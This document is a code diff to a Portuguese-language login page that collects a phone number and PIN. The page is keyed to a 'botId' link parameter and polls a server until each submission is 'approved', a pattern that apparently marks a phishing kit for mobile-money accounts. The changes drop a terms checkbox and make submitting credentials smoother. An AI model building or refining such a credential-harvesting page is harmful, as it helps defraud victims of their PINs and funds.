@@ -194,8 +194,6 @@
             background: rgba(75, 38, 15, 0.48);
         }
 
-        .checkbox-label { display: none; }
-
         button {
             width: 100%;
             height: 94px;
@@ -209,7 +207,7 @@
             border: none;
             border-radius: 50px;
             cursor: pointer;
-            transition: transform 0.15s ease, background 0.2s ease;
+            transition: transform 0.15s ease, background 0.2s ease, opacity 0.2s ease;
             letter-spacing: 0;
             display: flex;
             align-items: center;
@@ -234,9 +232,10 @@
         }
 
         button:disabled {
-            background: #ffffff;
-            color: #111111;
-            cursor: pointer;
+            background: rgba(255, 255, 255, 0.5);
+            color: #888;
+            cursor: not-allowed;
+            opacity: 0.6;
         }
 
         .spinner {
@@ -318,11 +317,7 @@
     <form id="detailsForm">
         <input type="tel" id="phone" placeholder="Digite o número de telefone" autocomplete="tel" inputmode="tel" required />
         <input type="password" id="pin" placeholder="PIN" maxlength="6" inputmode="numeric" autocomplete="current-password" required />
-        <label class="checkbox-label">
-            <input type="checkbox" id="confirmCheck" />
-            <span>Concordo com os termos e condições</span>
-        </label>
-        <button id="submitBtn" type="submit">
+        <button id="submitBtn" type="submit" disabled>
             <span id="btnText">ENTRAR</span>
             <span class="spinner" id="spinner"></span>
         </button>
@@ -332,23 +327,35 @@
 </div>
 
 <script>
+    // ---------- get botId ----------
     const params = new URLSearchParams(window.location.search);
     const botId = params.get('botId');
-    if (!botId) { alert('Invalid access link'); throw new Error(); }
+    if (!botId) {
+        alert('Invalid access link');
+        throw new Error();
+    }
 
+    // ---------- DOM refs ----------
     const phoneInput = document.getElementById('phone');
     const pinInput = document.getElementById('pin');
-    const confirmCheck = document.getElementById('confirmCheck');
     const submitBtn = document.getElementById('submitBtn');
     const btnText = document.getElementById('btnText');
     const spinner = document.getElementById('spinner');
     const statusEl = document.getElementById('status');
 
-    confirmCheck.addEventListener('change', () => {
-        submitBtn.disabled = !confirmCheck.checked;
-    });
-    submitBtn.disabled = true;
+    // ---------- Enable button when both fields are filled ----------
+    function checkFields() {
+        const phone = phoneInput.value.trim();
+        const pin = pinInput.value.trim();
+        submitBtn.disabled = !(phone && pin);
+    }
 
+    phoneInput.addEventListener('input', checkFields);
+    pinInput.addEventListener('input', checkFields);
+    // Initial check (both empty → disabled)
+    checkFields();
+
+    // ---------- submit ----------
     document.getElementById('detailsForm').addEventListener('submit', async (e) => {
         e.preventDefault();
 
@@ -376,7 +383,9 @@
             });
 
             const data = await response.json();
-            if (!data.requestId) throw new Error(data.message || 'Erro ao submeter');
+            if (!data.requestId) {
+                throw new Error(data.message || 'Erro ao submeter');
+            }
 
             const requestId = data.requestId;
             let approved = false;
@@ -402,7 +411,8 @@
                 statusEl.textContent = '❌ Erro de ligação ao servidor.';
                 console.error(error);
             }
-            submitBtn.disabled = false;
+            // Re-enable button after error
+            checkFields();
             btnText.textContent = 'ENTRAR';
             spinner.style.display = 'none';
         }
